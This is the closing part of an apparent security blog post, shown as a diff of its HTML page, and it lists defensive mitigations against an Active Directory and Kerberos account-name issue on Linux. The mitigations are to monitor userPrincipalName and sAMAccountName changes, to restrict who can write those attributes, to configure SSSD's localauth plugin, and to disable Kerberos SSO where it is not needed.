+<blockquote>
+  <p>to avoid this kind of issues SSSD provides a localauth plugin, please see man sssd_krb5_localauth_plugin about how to configure it.</p>
+</blockquote>
+
+<h2 id="mitigations">Mitigations</h2>
+
+<ol>
+  <li>
+    <p>You can monitor for any changes to the <code class="language-plaintext highlighter-rouge">userPrincipalName</code> or <code class="language-plaintext highlighter-rouge">sAMAccountName</code> attributes in Active Directory, as well as ensuring that users are not able to write to these attributes.</p>
+  </li>
+  <li>
+    <p>If you are using <code class="language-plaintext highlighter-rouge">SSSD</code>, you can also configure the <code class="language-plaintext highlighter-rouge">sssd_krb5_localauth_plugin</code> plugin to prevent this issue. You should also disable <code class="language-plaintext highlighter-rouge">Kerberos SSO</code> on the Linux system if you do not require it.</p>
+  </li>
+</ol>
+
+
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+
+        if (content.classList.contains('expanded')) {
+            content.classList.remove('expanded');
+            button.classList.remove('expanded');
+            button.innerHTML = 'Table of Contents';
+        } else {
+            content.classList.add('expanded');
+            button.classList.add('expanded');
+            button.innerHTML = 'Table of Contents';
+        }
+    }
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
